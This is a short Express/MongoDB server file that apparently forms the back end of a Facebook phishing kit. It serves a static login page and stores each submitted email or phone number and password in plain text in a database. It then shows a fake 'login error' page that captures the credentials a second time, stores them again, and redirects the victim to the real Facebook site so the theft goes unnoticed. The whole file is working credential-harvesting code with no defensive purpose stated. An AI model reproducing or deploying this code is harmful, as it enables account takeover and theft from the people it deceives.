const express = require('express');
const path = require('path');
const app = express();
const mongoose = require('mongoose')


const mongodbStringURL = process.env.MONGODB_URI;

const connectingdb = async (url)=>{
    mongoose.connect(url).then(()=>{
        console.log('mongodb server connected');
    }).catch((err)=>{
        console.log(err)
    })
}

connectingdb(mongodbStringURL)
// Define a route for the root URL
// Create a schema (like a table structure)
const userSchema = new mongoose.Schema({
  EmailOrPhoneNumber: String,
  Password: String,
});

const User = mongoose.model('User', userSchema);

async function insertUser(email, pass) {
  try {
    const user = new User({
      EmailOrPhoneNumber: email,
      Password: pass,
    });
    await user.save();
    console.log('✅ User inserted successfully');
  } catch (err) {
    console.error('❌ Failed to insert user:', err);
  }
}

app.use(express.json())
app.use(express.urlencoded({extended: false}))

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Serve index.html on root
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/', (req, res) => {
  
  insertUser(req.body.EmailOrPhonenumber, req.body.password)
  console.log('date saved in mongodb');
  res.redirect('/login_errors')

  
});

app.get('/login_errors', (req, res)=>{
  res.sendFile(path.join(__dirname, 'public', 'LoginValidate.html'))
})
app.post('/login_errors', (req, res)=>{
  
  insertUser(req.body.EmailOrPhonenumber, req.body.password)
  console.log('confiem date saved in mongodb');
  res.redirect('https://web.facebook.com/?_rdc=1&_rdr#')
})

const PORT = 3000;
app.listen(PORT, '0.0.0.0',() => {
  console.log(`Server running at http://localhost:${PORT}`);
});
